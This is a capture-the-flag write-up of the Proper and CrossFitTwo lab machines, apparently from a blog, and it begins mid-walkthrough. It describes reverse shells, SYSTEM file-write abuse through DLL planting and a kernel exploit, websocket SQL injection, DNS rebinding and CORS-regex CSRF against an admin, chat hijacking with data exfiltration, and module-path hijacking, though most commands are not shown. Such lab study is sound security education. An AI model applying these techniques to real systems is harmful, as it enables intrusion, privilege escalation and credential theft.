inotify-tools is an awesome set of tools to monitoring for file access (apt install inotify-tools). I used incron (similar package) to automate some stuff on ScriptKiddie. inotify-wait will hang until a file is accessed, and then return. So my first attempt to trick this page was to echo an ok string into header.inc, then inotify-wait for the file to be read the first time, and then replace the contents with a PHP payload. On refreshing the page, it runs:
It didn’t work.
At first I thought it was too slow. But on thinking about it, the error means that either the hash was mismatched (which isn’t the case), or that the file_get_contents read is seeing the <?. Does that mean that as soon as the SMB server starts to open it, I’m replacing the contents with the PHP. What if I try a sleep?
It worked!
I’ll turn this into a shell by replacing the PHP code with something to run nc.exe from my host:
On refresh, it takes a minute, but I get a shell at nc:
I can now access user.txt:

Category: Shell as root
I uploaded WinPEAS over SMB to the box and ran it. In the services section, one jumped out as unusual to me:
Most of the others were .sys files, or executables that I could find online. It’s also unusual to see an executable sitting in C:\program files (usually it’s only folders). nssm.exe looks like the Non-Sucking Service Manager. I don’t think this is interesting in it’s own right, but it does imply I should be looking at services
There’s also an unfamiliar folder in Program Files, Cleanup:
In that directory are three files:
I don’t have the ability to list services:
But I can go into the registry and look for service keys that include cleanup:
There’s a service named Cleanup. And it runs the server.exe:
I’ll grab copies of client.exe and server.exe to test locally.
It’s always important to run binaries from CTFs in a VM environment. This binary will delete files in the current user’s Downloads folder. Make sure you have a snapshot before starting.
Trying to start the client without the server returns:
The two binaries are using named pipes to communicate (I’ll explore this more in Beyond Root). Also, it mentions that it’s trying to clean my Downloads folder. Double-clicking on the server pops an empty console windows. Now when I run the client, it looks like the connection eventually times out:
Still, there’s output in the server.exe window:
There’s also now files in C:\programdata\cleanup:
Those all decode to the path to the file that was removed:
The files are just encrypted blobs of random data.
One interesting thing - all of those files were already in my Downloads folder. When I tried to create a new file in Downloads and run client.exe, it doesn’t get cleaned up.
The binary is written in Go, which makes it super difficult to reverse, for many reasons. One, it brings all it’s dependencies along, so they are in the binary and you’ll want to avoid reversing those. Additionally, there’s all kinds of weirdness with how things are handled. For example, strings are all lumped together into blobs, and not null terminated. Instead, a string object has two parts, a pointer to the string, and a int length.
I’ll use both Ghidra and Ida (free) to take a look at things. The binary isn’t stripped, so it’s possible to find all the functions that start with main, which is where Go groups the main code. For example, in client.exe, Ghidra shows:
In client.exe, I went looking for the Cleaning %s string. It directed me here (Ida):
It’s marked in red. What’s also interesting is the string Restoring %s, which indicates it has some capability to bring back the file it cleaned. That’s likely what I saw in ProgramData.
There’s also functions for serviceClean and serviceRestore.
Neither Ghidra nor Ida gave a great picture of how the binary worked, but I used x64dbg along with them to figure out what was going on. It helps to disable ASLR in your reversing VM to easily map between the two.
At the start of main.main, there’s some checking that turns out to be looking at passed in args. It sets two variables based on the results, which I’ve named cmd_str_len and cmd_str:
The globals I’ve named CLEAN and RESTORE are in the middle of the giant ASCII blobs I showed above, and look like this in Ghidra:
There’s no null to terminate the string, which is why the length is stored in a variable. Similarly, when it goes to look at the second argument passed in, ARGV+0x18 holds the length of that string, and ARGV+0x10 holds the pointer to the string itself. This is weird having never reverse Go binaries before.
Still, I can stumble through to realize that if there are 2 or more arguments, and the second arg has length 2 and a value 0x522d, or -R, it will set that cmd_str to RESTORE, and otherwise to CLEAN.
Some guessing around showed that it works if I pass in the original path to the file:
The file is back, and the corresponding base64-named file is no longer in \programdata\cleanup.
There’s another important thing I learned debugging and jumping around this binary. In the main.clean function, it gets the current time with time.now(). It then enters a while loop, where it is looping over each file in the directory, eventually calling os.Stat. This returns information about the file. It does some conversions, eventually subtracting a time value from os.Stat from the value calculated using time.now(), and compares it to 0x278d00:
If the difference is less than 0x278d00, it doesn’t  call main.serviceClean.
So it is only moving files that are more than 30 days old.
The original file is somehow encrypted and stored in programdata, with a name that is the base64 of the original name. I wondered what would happen if I changed that name?
I created a dummy file, and set the timestamps back to the start of the year:
I’ll clean it:
It shows as cleaned in the server:
And the file is now in programdata as QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdC50eHQ=:
I’ll create a new name (the -n is important, as the newline will otherwise be in the base64 and mess up the restoration):
And copy the file to that name (in C:\ProgramData\Cleanup):
On restoring, it exists in this new directory:
I’m going to guess that the write occurs as the user running the server.exe process. On my machine, that’s just me (I could test by running it as another user on that VM), but on Proper, that’s likely System.
I’ll try the same thing on Proper:
Clean it:
Create a filename:
Copy the backup into place:
Restore:
That looks a lot like arbitrary write as SYSTEM.
Converting arbitrary write to shell on Windows is less trivial than on Linux, but still possible. PayloadsAllTheThings has a section on it. It mentions DiagHub (which I used back in HackBack) as now patched, UsoDLLLoader (may be patched in some insider builds), and WerTrigger. I was able to get the WerTrigger POC to work.
The way to exploit this is to write the phoneinfo.dll binary from the repo into C:\Windows\System32 and then trigger it’s being run with the error reporting process.
I’ll upload phoneinfo.dll to Downloads and update the timestamps:
Now run the cleaner:
I’ll need the new filename in System32:
Use that to make the copy and then restore:
I’ve just written a dll into System32 that will be used when the windows error reporting program runs.
The GitHub repo has a binary that triggers the backdoor. The source shows it does the following tasks:
I can do these steps without the binary.
I’ll make the directory above, and upload the Report.wer from GitHub into it:
Now I’ll trigger the error reporting task:
There’s now a shell listening on 1337:
I could create a tunnel to it, or just upload nc and connect locally. I’ll do the later:
I can now get the flag:
I heard that other solved this challenge by converting the cleanup processes into arbitrary read as well as write. To do this, I’ll show a tool called Pipe Monitor from IONinja. The tool only comes with a free 7-day license, but that’s enough to solve this part.
I’ll install it in my Windows VM, start it, and create a new session. In the window, I’ll select “Pipe Monitor” and make sure to check the “Run as Administrator” box. Then I’ll click OK, and click on the Capture icon on the right to start a capture:
With the server already started, and a file old enough to be cleaned up in place, I’ll run the client.exe. The communications between client and server are exposed. The client is sending the command CLEAN [path]\n to the pipe. I’ll restore the file, and it’s also just sent as commands in plaintext into the pipe:
client.exe only checks in the users Downloads directory. But if I write my own client, I can send whatever files I want over the pipe.
I’ll create a handle to the pipe and connect to it:
Now I’ll create a StreamWriter object to write into the pipe:
I’ll clean root.txt:
It worked:
That’s root.txt. I’ll copy it to \programdata:
I can restore it the way I did before, and there’s the flag:
This is just another way to abuse the arbitrary write. This path takes two hops to get to SYSTEM, first through the network service user.

Category: Shell as network service
I need a DLL payload, and AV isn’t causing issues on this box, so I’ll create one with msfvenom:
I’ll upload it to Proper, change the times, clean it to get it into storage:
I want to move this file to system32 as tzres.dll:
This DLL is called by the systeminfo command, so running that will trigger a reverse shell to me as network service:

Category: Shell as SYSTEM
network service does have SeImpresonatePrivilege:
So I could run RoguePotato to get a shell from here. There’s also this post by Forshaw, which details how to target the RPCSS service process, which also runs as NETWORK SERVICE and almost always has tokens for SYSTEM. The post goes into how to steal them. And Decoder wrote an executable to just do that automatically.
I’ll download Decoder’s repo into a Windows VM, double click the .sln file to open it in Visual Studio, and select build. Once that succeeds, I’ll copy the resulting .exe back to my Parrot VM, and upload it to Proper.
Running it prints the syntax:
Some playing around with it reveals that if I don’t use -i, it doesn’t show me output or wait for a return. Once I figured that out, it works:
I can just use the nc64.exe already on Proper to get a shell:
It hangs there, but at nc there’s a shell:
This really slick POC for CVE-2021-1732 was published about a week and a half before Proper’s release, and Proper was vulnerable to it at it’s release (though I don’t know of anyone who first solved it this way).
I’ll download the repo to my windows VM, open it in Visual Studio, and build it as is. There are a bunch of warnings, but it succeeds:
I’ll copy that output exe to my Parrot VM, and then upload it to Proper:
The gif on GitHub shows it running as Exploit.exe whoami, so I’ll give that a try. It works:
I’ll try a reverse shell with nc64.exe that I uploaded earlier:
It hangs, but there’s a shell at another nc listener:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 20 Mar 2021
OS : OpenBSD
Base Points : Insane [50]
Creators : MinatoTWpolarbearer
Nmap scan:
Host is up (0.093s latency).
Not shown: 50822 filtered ports, 14710 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8953/tcp open  ub-dns-controlCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and ub-dns-control (8953):
The HTTP headers show the HTTP server is running OpenBSD httpd.
The TLS certificate on 8953 shows the common name of unbound, which makes sense since 8953 is the default port for control operations on the Unbound DNS resolver. It is interesting to see the DNS resolver control port, but not DNS itself, the box isn’t listening on TCP or UDP 53:
Just like the first Crossfit box, the site is for a cross-fit gym:
Clicking around a bit, there’s a contact form on the Contact page, but nothing that I could get much response from. There’s a search link at the top of the site, but no obvious exploitation vectors there either.
The link to “Member Area” goes to employees.crossfit.htb. I’ll add the subdomain to /etc/hosts:
Initially I added crossfit.htb as well, but it was already in /etc/hosts from the first box, and after some testing, it doesn’t seem to be used here.
index.php returns the same main page, so I know this is running on PHP. The HTTP headers confirm this and give the version:
There’s nothing else too interesting in the HTTP headers.
I’ll run feroxbuster against the site:
/lgn is the only interesting bit, but it just returns a 403 forbidden, and there’s nothing else interesting that comes back from there.
If I look closely at Burp on loading the main page, there’s a request that jumps out:
gym.crossfit.htb is new. /ws/ is almost certainly show for websocket.
In the source at the bottom, there’s a list of JavaScript includes:
All but the last two look like publicly available things. There’s not much interesting in main.js (mostly just controlling the site and it’s features), but ws.min.js is interesting:
As expected by the min in the name, it’s compressed with no whitespace. JSNice is my JavaScript beautifier of choice, and it cleans it up a bit. After a function that handles the scrolling in a element with ID chats, it creates a connection to over a websocket to gym.crossfit.htb/ws/:
Websockets are a protocol designed to allow for two way communication over a single TCP connect at layer seven. It’s a way for pages delivered over HTTP to start and maintain connections and communication without initiating the connection each time.
Later in the JS, there’s a bit that checks a websocket message, and if it starts with “Hello!”, it displays an object with the ID ws:
That is a <div> at the bottom of the page that on load is set to display: none:
I’ll add gym.crossfit.htb to /etc/hosts, and refresh. Burp shows that request now returns a HTTP 101:
That’s a “Switching Protocols” response:
In the WebSockets history tab in Burp Proxy, there’s not a message from the server:
That message starts with “Hello!”, which is why the div becomes visible. There’s also a token, which is referenced throughout the JS.
The new div is now visible floating at the bottom left of the page:
Another interesting function from ws.js looks for keystrokes and eventually sends what I type:
It does look like each time a message is received from the server, the new token is stored as token, and then sent back in the next message.
Sending “help” as the message suggests sends a message to the server, and a response to the client (my browser comes back):
The raw return message is:
And it shows up in the chat box:
Sending “coaches” returns a list of coaches, and “classes” returns a list of classes. “memberships” returns four buttons:
Clicking them in order shows that three of them return that the plan is available and one says unavailable:
Clicking the first button sends the following JSON:
The others are the same but with a new token and a params of 2-4. The response looks like the other responses, but with an additional item, debug:
When the plan is not available, the debug just shows the id:
Given the use of Virtual Host Routing, I’ll look for others with wfuzz, and find employees:
I’ll add employees.crossfit.htb to /etc/hosts.
gym.crossfit.htb doesn’t even show up - why is that? It has the same response to a normal GET request as the main website:
This is a good reminder about vhost fuzzing - just because it comes back the same, doesn’t mean there isn’t something interesting there. It just means that that one request was the same.
The employees subdomain has a login form:
Guessing at the login doesn’t leak if the username is valid:
Basic SQL injections didn’t turn up anything.
The “forgot password” link leads to password-reset.php, which asks for an email address:
Anything I put in there returns the same error:
Nothing interesting from feroxbuster:
I tried running with -x php, but it seems any page that doesn’t exist actually returns a 403 with the body “Access denied.”. I’ll use -C 403 to filter those from the results:
It doesn’t find anything new.
Reading about Unbound, 8953 is the control port, and it is connected to by the unbound-control application. In my Parrot VM, I’ll run sudo apt install unbound to install Unbound and the control utility. The help dialog for unbound-control is long, and there are a ton of commands. I’ll try status. It also shows -s will specify a server:
That file is owned by root. I’ll run this with sudo, but new errors:
It’s trying to authenticate the client, but the certificates don’t match. Looking through the man page for Unbound Config, there’s an option control-use-cert in the remote-control section:
control-use-cert: *<yes or no>*
For localhost control-interface you can disable the use of TLS by setting this option to 
“no”, default is “yes”. For local sockets, TLS is disabled and the value of this option is ignored.
I’ll try setting this in /etc/unbound/unbound.conf:
Now running it returns nothing, so it’s probably not working. I’ll see if I can find the keys to authenticate. I’ll also reset my config file back to default.
For initial enumeration, I found two solid methods for interacting with the websockets. Burp is really nice here. I can find one of the websocket messages from the Proxy -> Websocket History tab and right click and send it to Repeater:
At this point, the websocket connection isn’t live. I’ll click Reconnect or toggle the button to the left of “History” to connect, and then the first message with “Hello!” from the server shows up:
The incoming and outgoing messages show up on the top right. I can craft messages on the left. If I update the token and send, it works:
Alternatively, I can use the Python3 websockets module from the command line. I’ll need to type out (or paste) the full JSON responses:
A standard SQLi check is to send a ' character, but that does nothing interesting here:
The debug output shows that it just handled the id as 3'. Thinking about it, given that this query is matching on an int and not a string, it doesn’t make sense to try to close the ' or ". The SQL on the server likely looks like:
I’ll try to send a plan I know doesn’t exist (like 3) and then some logic to get a result back anyway:
That worked! The or 1=1 would make all the rows return, and then the limit 1 just gets the top (since it’s almost certainly expecting only one). It actually works the same without the limit:
This is confirmed SQL injection.
First I’ll need to find the number of columns, and I correctedly guessed it was two:
I can get things like the current user and current database:
I’ll show two ways to exploit this SQL injection in websockets, first with a Python shell that allows me to easily send injections, and then using sqlmap and a custom flask proxy.
To exploit this, I’ll create a Python script to manually read in injections from me at the command line, and then print the result. I’ll use the cmd module to make a pretty terminal with up arrow for history support. The first attempt I made was:
Basically I create a Term class which subclasses Cmd. I set the prompt, and use the __init__ function to create the connection to the websocket, and get the first token. The default function will run on any input, with the input as args. It will send the input as the params argument in the JSON payload, including the most recent token, and then read the response, update the token, and print the debug.
The issue this would run into is that waiting more than a few seconds to look up the SQL for the next injection would lead to a timeout on the websocket, and an exception on the read. I refactored a bit to now catch that error, reconnect, and then continue:
Running it, I can send the same kinds of payloads shown above:
I can easily list the databases as well:
I could take this further by adding commands. For example, with a little refactoring, I’ll add two commands that will list the databases and the tables within a database:
Now in the shell, shows additional commands:
Running them works as expected:
It would be easy to add commands to list columns in a given table and to dump rows from the table as well.
An alternative to doing the SQL injections manually would be to use the power of something like sqlpmap to enumerate this database. As of the time of this post, there isn’t a way to target a websocket connection in sqlmap. I’ll write a simple Flask webserver that will get a request with a single parameter, and use that to make the websocket connection with that parameter as the injection. This allows sqlmap to see a standard HTTP server, but then it does the websockets injection.
This will wait for a web request to /, and then initiate the websocket connection. It will read the token, and then get the params parameter from the request. Now it will send the injection over the websocket with the valid token and the params set to the request parameter input, and return the debug part (where the injection is). I’ll load the string to an Python object using json.loads, and then pull the debug part to return.
Now I’ll run sqlmap through it. I’ll use a couple flags:
It works:
It’s not surprising that it found the injection. But now I can do normal enumeration, like list the DBs by adding --dbs:
Replacing --dbs with --tables, it’ll dump all the tables:
With two methods to enumerate the database, I’ll look around at what’s there. The membership_plans table has the plans I found earlier (-D crossfit -T membership_plans --dump):
Switching to the employees database, the employees table has four entries (-D employees -T employees --dump):
The password_reset table returns empty (-D employees -T password_reset --dump):
Earlier, I found a login page and a password reset form, but I was unable to use it because I didn’t have any valid email addresses. If I enter one from the employees table above, it returns:
Now that’s in the DB as well:
Earlier feroxbuster only found index.php and password-reset.php. I can guess that perhaps the link in the user’s email is to password-reset.php perhaps with the token as a parameter, which would look like http://employees.crossfit.htb/password-reset.php?token=9f1d6826985f0179ed38afd3d65b54a640659c9dc519174c08c66f65419f73b6. Unfortunately, it returns:
That does imply that I guessed the format of the link correctly. Changing the parameter name from token to something else just returns no message, which I suspect is because the script is checking for the existence of token. My best guess at this point is that the DB holds a hash of the token.
Another thing to check with sqlmap is the current user’s privileges with --privileges:
I could also see this manually:
FILE gives the following:
​            Affects the following operations and server behaviors:
As a security measure, the server does not overwrite exsting files.
MySQL can read files using the LOAD_FILE() function. It works:
I’ll add a read command to my Python shell:
sqlmap will also read files using --file-read=/etc/passwd, but it saves it to a file which I then have to open, which is a minor pain.
I spent some time with hashcat trying to break both the token and the passwords for the accounts dumped from the database. Both looks like SHA256 hashes, but no wordlists I tried returns anything.
I tried to read the Unbound config file, but failed:
On OpenBSD, it’s actually at /var/unbound/etc/unbound.conf according to the docs. That worked:
Control is enabled on all interfaces, and it’s using certs. I’ll read unbound_server.pem, unbound_control.key and unbound_control.pem, and save them in /etc/unbound on the local VM. Now I can connect to Unbound:
I played with a bunch of other commands on the man page, but didn’t find much useful. Many of the commands didn’t exist (view_local_zone, auth_zone_transfer, list_auth_zone, etc). I can’t set up individual domains, but it looks like I can add a forward for a zone:
I really wish I had a good way to test if this was actually leading to DNS resolutions, but I couldn’t come up with one. I don’t have a plan for this yet, but it will prove useful later.
I took some guesses at where the PHP source might be, but came up empty. For example:
The OpenBSD httpd config file should be at /etc/httpd.conf:
Interestingly, it lays out three servers:
All the servers are listening on localhost, so something else must be proxying requests to port 80 over to these ports. I assumed at this point that chat was the websockets, but I’ll see later it’s not.
Googling for “openbsd reverse proxy”, all the results come back talking about relayd:
The first stackexchange link even has ASCII art that looks like the setup on CrossFitTwo:
The config file confirms this setup:
That’s kind of hard to make sense of, but it helps to start with relay web:
It’s listening on 80, and then references protocol web, which is defined above:
If the hostname is *employees.crossfit.htb, it will forward to <2>. <2> is defined as table<2>{127.0.0.1}, and back in the relay block, forward to <2> port 8001 indicates the port. *employees.crossfit.htb will go to localhost:8001, which fits with the employees vhost defined in the httpd config.
I created a diagram at this point to show what I know and don’t know:
Two things that are worth noting:
I’ll update /etc/hosts to now include crossfit-club.htb and then visit. It’s another login portal:
Attempting to sign in just produces a failure message:
The link to SIGN UP leads to a page with a disabled form:
Viewing the button in the Firefox dev tools shows that it’s disabled:
I’ll edit it to remove the class v-btn--disabled and disabled="disabled", and now the button looks active:
Still, clicking on the button doesn’t generate any network traffic.
The <form> element in the HTML shows the following inputs: username, email, password, and confirm. I’ll note these for later.
When I try to login, there is network traffic generated. Looking in Burp, the request looks like:
The parameters are submitted as JSON, along with the Content-Type: application/json header. There’s a CSRF token in the X-CSRF-TOKEN header.
The response:
The headers show it is Express, a NodeJS frame work that runs on 5000 by default (so that matches what I noted in the diagram above).
Given the POST to /api/login, it seems like a good idea to look at that API, as perhaps the sign up endpoints are active there, even if the page doesn’t send.
Burp shows the requests to the different JavaScript files requested on loading this page:
There’s a ton starting with chunk-vendors~, but also one that starts with app~. Using curl, grep, and sort I’ll isolate unique references to /api:
Throwing the JavaScript into beautifier.io shows where these are used. The two for /api/gridy are to another site. The other two are interesting. /api/auth:
/api/login:
The code is still obscure, but there are both GET and POST requests, as well as data for the POST to /api/login.
Replicating these with curl, /api/auth returns a token:
I observed /api/login above.
Shifting focus a bit, I want to fuzz for more endpoints. I find that subdomains can be good approximations for parameters, so I’ll try that kind of wordlist, and it finds more:
I’ll also try with POST requests, which finds different endpoints:
signup is what I was looking for. A POST request without data returns:
When I observed the POST to /api/login above, the CSRF token was passed in the X-CSRF-TOKEN header, which can be fetched from /api/auth. I could also verify that with an OPTIONS request that shows it accepts a X-CSRF-TOKEN header:
Typically, this token is associated with a cookie between requests, and /api/auth is setting a cookie:
I’ll use curl and the -c to save cookies to a file, and then -b to read from that file.
I was hoping for an error about which fields were missing, but rather, it’s still not happy with my cookie, as it doesn’t belong to an admin. I’ll come back to this.
I started out thinking I needed to reset the admin’s password, but that ended up not working.
What I’ll need to do is create a user on the crossfit-club.htb site. To do that, I need an admin to make the API request. The only way I know of to send an admin a link here is using the password reset link, but presumably, that just sends a link to employees.crossfit.htb.
The next step was inspired by this HackerOne report. Basically, the site wanted the password reset script to be robust against website name changes, so it used the Host header to generate the link that gets sent to the user.
I can modify the Host header in a password reset request. I’ll need to do it so that relayd still routes it to the Employees site. I can use unbound-control so that the domain resolves to me, and that will get an admin requesting a page from my host. I can return a page with the JavaScript necessary to make the request to the API to create an account for me. If that works, I’ll have an account and can log in.
I need a domain name that will route through relayd and reach the site on 8001, so it will have to match *employees.crossfit.htb. I don’t want to hijack the entire site, but I showed above that something like 0xdf-employees.crossfit.htb will reach the site on 8001.
I’ll use unbound-control to tell CrossfitTwo that I’m the server for that zone (it’s worth noting that this is cleared every few minutes, so worth resending if things stop working):
While I’m still testing to see if this is going to work, I’ll just listen on UDP 53 with nc to see if that resolution happens.
I’ll go back and submit a password reset request for david.palmer@crossfit.htb (because his username was administrator) just like above, but catch the request in Burp Proxy and kick it to Repeater. I’ll update the Host header to the new domain:
On sending, there’s a request immediately at nc:
It’s junk, but it there are no other reasons why CrossfitTwo would be connecting to my host on UDP 53. Unfortunately, in the response:
Given both the error message and the immediacy of the response, it seems clear that the webserver code must be doing a DNS resolution on the host and making sure that the host comes back as 127.0.0.1.
Googling for “fake DNS server” led to this repo, a good looking DNS server with some useful features. I’ll clone a copy, and create a config file. To start, I just want to resolve 0xdf-employees.crossfit.htb to 127.0.0.1 to get see if that sends the reset link. I’ll start with a simple config to do that:
Now I’ll send the same request, and immediate there’s two hits at the server:
Looking in the rendered page, it seems to have worked:
About 30-45 seconds later, there’s another:
My best guess at this point is that the first two are the server doing validation on the host, and the one after some delay is the user clicking on the link.
A really cool feature of this DNS server is that it can do DNS rebinding. The README shows this example:
Means that we have an A record for rebind.net which evaluates to 1.1.1.1 for the first 10 tries.  On the 11th request from a client which has  already made 10 requests, FakeDNS starts serving out the second ip,  4.5.6.7
In this case, I’ll want to resolve the first two to localhost, then switch so that when the administrator clicks the link, they visit me:
I like to run with sudo tcpdump -ni tun0 udp port 53 running as well to see what’s happening.
I’ll start nc listening on 80 to see what kind of response I get, and then send the request again. When FakeDns shows the first two resolutions, tcpdump shows they are to 127.0.0.1:
When there’s another request at the DNS server, tcpdump shows it resolving to my IP (twice for some reason):
At nc, there’s an HTTP request:
At this point I thought I would have access to the admin’s account by visiting that link. I was disappointed to find on visiting:
I still have the admin coming to visit a page that I’m hosting.
I’m going to build up a script to do the CSRF, but it took me a lot of tries to get it right. Killing and restarting fakedns.py, making sure to always forward the zone with unbound-control in case it had timed out, and refreshing Firefox got tedious, so I wrote a simple script to trigger the request from the admin:
It starts fakedns.py in the background, and records the pid. Then it forwards the zone, then triggers the reset email with curl. It sleeps 60 seconds, and then kills fakedns.py. My webserver and any other connections I want to catch can be managed in other tmux panes.
Now that the admin is requesting a page from my IP, I can serve a page containing JavaScript that will make requests. This will end up being a complex set of XMLHttpRequest objects, just like in the original CrossFit machine. I like to build in smaller pieces, so I’ll start with simple JavaScript to make a POST back to me.
I’ll start with a page with script designed to just POST back to my VM:
With the Python webserver running (python3 -m http.server 80), I’ll run the trigger script:
That last resolution is the browser click, and there’s a request at the webserver:
But I would then expect another POST to /test, but it doesn’t come. To test (after making sure to set my /etc/hosts file to point 0xdf-employees.crossfit.htb to my IP), I visited http://0xdf-employees.crossfit.htb/password-reset.php in Firefox:
This is because of the Content-Type header Python is including in the HTTP response:
Firefox isn’t sure how to display application/octet-stream, so it treats it like a file. If The automation on CrossfitTwo is also using a browser to view the page, then it won’t load the JavaScript and run it.
PHP has a webserver as well, so I’ll try php -S 0.0.0.0:80. On refreshing Firefox, there are multiple requests at the PHP webserver, including /test which indicates the JavaScript executed:
The response headers show this time the Content-Type is text/html, which Firefox knows how to display:
Interestingly, the PHP server shows the request to /test as a GET, but I tried for a POST. It turns out that’s just an error in the webserver. Watching in Wireshark, it’s clearly a POST:
I’ll re-trigger the exploit and I see the requests come in first for password-reset.php, and then for /test just like above. It loaded the PHP page and the JavaScript made a request!
To make the request to crossfit-club.htb/api/signup, I need an CSRF token. I’ll update the script to request one, and send it back to make sure it worked. I’ll remember from Crossfit that I need to use withCredentials to keep the cookie the same throughout the entire request, so I’ll add this now.
It doesn’t work. I see my HTML page requested, but then there’s no POST back to port 81. The request I know does work doesn’t even come back, implying the first one breaks. If I try it locally and look at the Console in the Dev Tools, I can see a potential issue:
The admin’s browser is visiting 0xdf-employees.crossfit.htb, and so the single POST back to that domain isn’t an issue. But when I try to make it issue a GET to crossfit-club.htb, if that domain doesn’t allow cross origin requests from 0xdf-employees.crossfit.htb, it will fail and end the JavaScript.
If crossfit-club.htb allows cross origin requests from a page, it will have a Access-Control-Allow-Origin header in the response to an OPTIONS request. For example, gym and employees allow for these requests, but the base domain and my spoofed domain do not:
The intended trick here (which is very hard to notice) is that often times these CORs allow whitelists will be entered as a series of regular expressions. If that’s the case, then CrossfitTwo could be configured to allow something like:
Done correctly, those . would be escaped as \., but without the escape, they represent any one character. It works because . is one character, but it also allows for additional domains. I can test this by looking at another OPTIONS request:
It works!
Unfortunately, this domain will not be routed by relayd to the site I want to use. How would I use a domain that matched both *employees.crossfit.htb and (gym|employees).crossfit.htb. The intended trick here again is to think about how each is viewed.
The PHP script that is looking at the Host header is parsing it to form the password reset link. It is likely to break the string apart on a special character. But relayd isn’t looking at that character, but the entire host, and matching a regex on the end. That means that a request with a Host header that’s broken with a / could work. To test, I’ll register gymXcrossfit.htb with unbound-control:
Now I’ll send the password reset with the following Host header:
It worked:
The request is hitting relayd and being routed to the employees application because the Host header ends with employees.crossfit.htb. The application is handling the Host header as gymxcrossfit.htb, and sending the password reset link to the admin with this domain, which I’ve registered as my own, so the click leads them to my server.
Because the admin’s browser is now visiting gymxcrossfit.htb, additional JavaScript requests to crossfit-club.htb would only be allowed if it accepts requests from that domain. It does:
With all that in mind, I’ll update my files to reflect the new domain.
password-reset.php:
trigger.sh:
Running that returns a token to the nc listening on 81:
Now that I can fetch a token, I’ll try to use it to register a user on the site. I don’t have an example of this request because it was removed from the site. But based on what I found above, I have the field names from the form, and I can assume it uses the same format as the /api/login POST.
I’ll add more JavaScript to try that request:
I’ll run the trigger script again. After a couple minutes, the request comes to the PHP server, and then immediately I get a request at nc on TCP 81:
The account works, and I’m able to log in!
Logged in, there’s a main page with a couple posts:
All the links lead here, except for Chat, which leads to a chat application. On first visiting, there are users down the left, including Global Chat and Admin:
After a minute or so, chats start coming into the global chat:
After logging in, the History tab in Burp started filling up with requests to /socket.io:
They seem to cycle about every 25 seconds. This looks to be an instance built on  Socket.IO. I’ll scroll up to look at what happens immediately after authenticating.
First, immediately after the call to /api/auth, there’s a GET to /socket.io/?EIO=3&transport=polling&t=Ng-iqHu which returns:
That sid is used as a cookie named io in future connections. It also confirms that 25 second polling interval I noticed above.
Next my browser sends a POST with  a user_join message:
The next message has a message with the state of all the users:
On sending a message to the the Global Chat, it sends a POST:
Messages from others come in as responses to the polling requests from my browser:
When I send a private message to a user, it goes out in one of the periodic POSTs with a body:
None of the users reply to my DMs. To see what receiving a DM looked like, I phished the admin again to create a second user. In Chromium, I’ll log in as that user. To see what receiving a DM looks like, I’ll message 0xdf from 0xdf2:
The message that comes back in Burp (which is only intercepting Firefox logged in as 0xdf) looks like:
I’m going to write a dummy JavaScript application that connects to the Socket.IO as Admin. From everything I can tell looking at the documentation and the requests that in Burp, as long as the connect.sid cookie matches the username sent in the user_join message, it will then start to send down messages.
I’ll create a simple HTML page that I can run locally to test. IT will need to do three things:
This local POC is telling the system my username is 0xdf, as my browser has a copy of the cookie associated with that name. I’ll load the page in Firefox (it’s empty, as expected), and then open the console in dev tools. From Chromium (logged in as 0xdf2), I’ll send a message to 0xdf:
The message comes in in the legit chat:
It also shows up in the dev tools console on the hijacked page:
I’ll update the script two ways. First, I’ll switch the user to Admin. Second, exfil via HTTP requests rather than just posting to the console. I’m going with a GET request with the data base64 encoded in the url because it turns out I need to get multiple messages before I get the one that’s interesting, and trying to catch a bunch with nc was causing issues.
I’ll trigger again, this time with a longer timeout to let the DNS run longer:
First comes the request for the HTML:
After that, there are messages that come in slowly:
Decoding them, one is really interesting:
Those creds work for SSH into CrossfitTwo:
The shell is actually csh:
It doesn’t allow for up arrow history, but switching to sh does:
And I can grab user.txt:

Category: Shell as john
david’s home directory is basically empty outside of user.txt.
There are three other home directories, but I can’t access any of them:
There’s a sysadmins directory in /opt which is owned by root and the sysadmins group, which david is in:
A few more directories down, there’s a single file, statbot.js:
The script creates a websocket connection to ws://gym.crossfit.htb/ws, and then writes a log to /tmp/chatbot.log as to if it was up:
The chatbot.log file was written less than a minute ago and is owned by john, which is a good sign that this script is being run as john (some analysis shows every minute):
I can try to run statbot.js myself, but it crashes:
It’s failing to load the websockets module ws.
There are three modules imported with the require statement in this script: ws, fs, and log-to-file. The NodeJS docs give an algorithm for where node looks to load a module. To simplify a bit, core modules (like fs) are loaded from the install. For modules like ws  and log-to-file, there’s a search of the filesystem, starting in the current directory and stepping up looking for a directory named node_modules. If that isn’t found, then it checks the environment variable NODE_PATH, and tries to load from there.
Given that there’s no node_modules directory in /opt, the calling john script must have NODE_PATH set. In fact, there’s a node_modules directory in /usr/local/lib that contains both ws and log-to-file, so it’s a good guess that’s what the variable is set to:
The search order means that if I can create a node_modules directory in any folder between / and /opt/sysadmin/server/statbot, the bot will try to load my script in place of the legit library. I’ll have to work fast, as every few minutes there’s a cron that cleans up the node_modules directory.
To test, I’ll use the child_process module to run system commands. I’ll use a ping to start.
First I’ll create the directory, then put the module into it:
When I run the script, it still errors out, but this time failing to import log-to-file:
There’s also an ICMP packet at tcpdump:
More importantly, around the time the cron runs, there’s another packet (two shown a minute apart):
The box is BSD, so the standard reverse shells may or may not work. nc is on the box, so I’ll replace the ping with a mkfifo reverse shell:
Once the minute rolls over, there’s a connect at my waiting nc:
I’ll upgrade the shell:

Category: Shell as root
There’s not much in john’s homedir other than the automation of the bot. But john does bring a group that the previous shell didn’t have access to before, staff:
There’s only one file that’s owned by this group (at least that I can access):
It’s a 64-bit ELF executable with the the SUID bit set, and owned by root:
Running it looks like it takes a log file to read:
It won’t read /etc/passwd:
There’s only one log in /var/logs and I can’t read it:
But log can:
Ghidra isn’t great with BSD binaries, but this one is actually not too bad to clean up. The syscalls are wrapped in little helper functions. So I’ll see something like:
When I click on the function, it returns decompiled code of:
Obviously it’s not just an infinite loop. Looking at the disassembly, it’s moving fseek into R11:
This is just a call to fseek. I’ll rename all the function in main to match.
Once cleaned up, the code looks like:
unveil limits visibility for the rest of the program to the path passed to it, in this case, read access to /var. Then it opens the passed in file, and if successful, prints the length and the values. There’s not much I can exploit here. I just get read access to anything in /var.
/var has a bunch of stuff in it:
A bunch of these are potentially interesting but are either empty (account) or I can’t access to list (audit, authpf, backups, cron/tabs)
Looking at db, yubikey jumps out:
